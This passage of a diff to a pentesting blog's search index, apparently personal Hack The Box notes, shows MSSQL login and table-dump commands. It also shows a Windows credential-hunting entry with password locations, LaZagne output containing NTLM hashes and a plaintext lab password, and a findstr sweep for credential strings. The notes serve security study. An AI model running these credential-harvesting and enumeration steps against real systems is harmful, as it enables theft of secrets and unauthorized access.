+<h5 id="mssqlclient"><a href="#mssqlclient" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target</span><br></pre></td></tr></table></figure>
 
 
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./windapsearch.py --dc-ip &lt;DC_IP&gt; -u <span class="string">&quot;&quot;</span> -U</span><br></pre></td></tr></table></figure>
+<h2 id="Windows-Authentication-Local-Account"><a href="#Windows-Authentication-Local-Account" class="headerlink" title="Windows Authentication (Local Account)"></a>Windows Authentication (Local Account)</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-1"><a href="#sqsh-1" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U .\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U HOSTNAME\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="mssqlclient-1"><a href="#mssqlclient-1" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target -windows-auth</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Domain-Authentication-With-DC"><a href="#Domain-Authentication-With-DC" class="headerlink" title="Domain Authentication (With DC)"></a>Domain Authentication (With DC)</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-2"><a href="#sqsh-2" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U domain\username -P password</span><br></pre></td></tr></table></figure>
+
+<h5 id="mssqlclient-2"><a href="#mssqlclient-2" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient domain/username:password@target</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Enumerate-Data-Base"><a href="#Enumerate-Data-Base" class="headerlink" title="Enumerate Data Base"></a>Enumerate Data Base</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h3><p>When using <code>sqlcmd</code>, each query must be followed by <code>GO</code> to trigger its execution.</p>
+<h5 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> name FROM master.dbo.sysdatabases</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="Select-Database"><a href="#Select-Database" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; USE htbusers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="Dump-Specific-Table"><a href="#Dump-Specific-Table" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> * FROM users</span><br><span class="line"><span class="number">2</span>&gt; go</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h3><h5 id="List-Databases-1"><a href="#List-Databases-1" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; SELECT name FROM sys.databases;</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="Select-Database-1"><a href="#Select-Database-1" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; use database-name</span><br></pre></td></tr></table></figure>
+
+<h5 id="List-Tables-1"><a href="#List-Tables-1" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=<span class="string">&#x27;BASE TABLE&#x27;</span> ORDER BY TABLE_SCHEMA, TABLE_NAME;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Dump-Specific-Table-1"><a href="#Dump-Specific-Table-1" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM table-name;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Users &amp; Passwords Enumeration</category>
-        <category>Making a Target User List</category>
+        <category>Service-Enumeration</category>
+        <category>MSSQL</category>
       </categories>
       <tags>
-        <tag>netexec</tag>
-        <tag>rpcclient</tag>
-        <tag>ldapsearch</tag>
-        <tag>enum4linux-ng</tag>
-        <tag>windapsearch</tag>
+        <tag>Enumeration</tag>
+        <tag>MSSQL</tag>
       </tags>
   </entry>
   <entry>
@@ -1177,51 +1177,19 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows Credential Hunting</title>
-    <url>/2025/11/26/Windows-Credential-Hunting/</url>
-    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
-<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
-<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
-<li><code>Passwords in scripts in the SYSVOL share</code></li>
-<li><code>Password in scripts on IT shares</code></li>
-<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
-<li><code>Password in unattend.xml</code></li>
-<li><code>Passwords in the AD user or computer description fields</code></li>
-<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
-<li><code>Found on user systems and shares</code></li>
-<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
-</ul>
-<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
-<ul>
-<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
-<li><code>Application credentials</code></li>
-<li><code>Wifi passwords</code></li>
-<li><code>Chat app passwords</code></li>
-<li><code>Mail client passwords</code></li>
-<li><code>Windows Credential Manager secrets (current user only)</code></li>
-</ul>
-<p>Administrator Access :</p>
-<ul>
-<li><code>LSASS</code></li>
-<li><code>LSA</code></li>
-<li><code>KeePass memory extraction</code></li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
+    <title>RDP Exploitation</title>
+    <url>/2025/12/04/RDP-Exploitation/</url>
+    <content><![CDATA[]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Credential Hunting</category>
+        <category>Service-Exploitation</category>
+        <category>RDP</category>
       </categories>
       <tags>
-        <tag>Lazagne</tag>
-        <tag>Search-for-File-Content</tag>
+        <tag>RDP</tag>
+        <tag>RDP-Session-Hijacking</tag>
+        <tag>Crowbar</tag>
+        <tag>Hydra</tag>
       </tags>
   </entry>
   <entry>
@@ -1325,6 +1293,54 @@
       <tags>
         <tag>mimikatz</tag>
         <tag>Invoke-TheHash</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows Credential Hunting</title>
+    <url>/2025/11/26/Windows-Credential-Hunting/</url>
+    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
+<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
+<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
+<li><code>Passwords in scripts in the SYSVOL share</code></li>
+<li><code>Password in scripts on IT shares</code></li>
+<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
+<li><code>Password in unattend.xml</code></li>
+<li><code>Passwords in the AD user or computer description fields</code></li>
+<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
+<li><code>Found on user systems and shares</code></li>
+<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
+</ul>
+<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
+<ul>
+<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
+<li><code>Application credentials</code></li>
+<li><code>Wifi passwords</code></li>
+<li><code>Chat app passwords</code></li>
+<li><code>Mail client passwords</code></li>
+<li><code>Windows Credential Manager secrets (current user only)</code></li>
+</ul>
+<p>Administrator Access :</p>
+<ul>
+<li><code>LSASS</code></li>
+<li><code>LSA</code></li>
+<li><code>KeePass memory extraction</code></li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Credential Hunting</category>
+      </categories>
+      <tags>
+        <tag>Lazagne</tag>
+        <tag>Search-for-File-Content</tag>
       </tags>
   </entry>
   <entry>
